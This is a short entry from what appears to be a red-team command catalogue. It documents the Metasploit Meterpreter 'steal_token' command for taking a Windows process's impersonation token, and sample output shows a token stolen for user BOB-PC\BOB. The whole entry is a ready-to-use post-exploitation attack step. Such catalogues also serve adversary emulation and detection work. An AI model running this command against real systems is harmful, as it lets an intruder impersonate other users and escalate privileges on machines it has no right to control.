---
id: 8dee6bec-add4-4aa2-a4ca-6b01722885f2
name: Metasploit Steal an Impersonation Token from the Target Process
type: command
executor: metasploit
data: steal_token $_PID
output: 'meterpreter > steal_token 1800

  Stolen token with username: BOB-PC\BOB'
created_at: '2020-07-09T00:51:44.413949+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Steal an Impersonation Token from the Target Process

```metasploit
steal_token $_PID
```

## Expected Output

```
meterpreter > steal_token 1800
Stolen token with username: BOB-PC\BOB
```


